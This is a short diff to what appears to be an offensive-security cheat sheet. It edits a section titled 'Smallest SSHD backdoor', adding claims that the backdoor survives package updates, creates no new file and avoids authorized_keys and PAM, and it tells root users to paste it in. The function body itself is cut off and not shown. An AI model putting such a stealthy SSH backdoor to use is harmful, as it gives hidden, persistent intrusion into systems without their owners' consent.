@@ -1800,7 +1800,11 @@ for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
 <a id="backdoor-sshd"></a>
 **6.iii. Smallest SSHD backdoor**
 
-Adding your key to *authorized_keys* is overused 😩. Instead, use this (root only):
+- Survives `apt update`
+- Does not create any new file.
+- Does not use `authorized_keys` or PAM.
+
+Adding your key to *authorized_keys* is overused 😩. Instead, cut & paste this (as root):
 
 ```shell
 backdoor_sshd() {
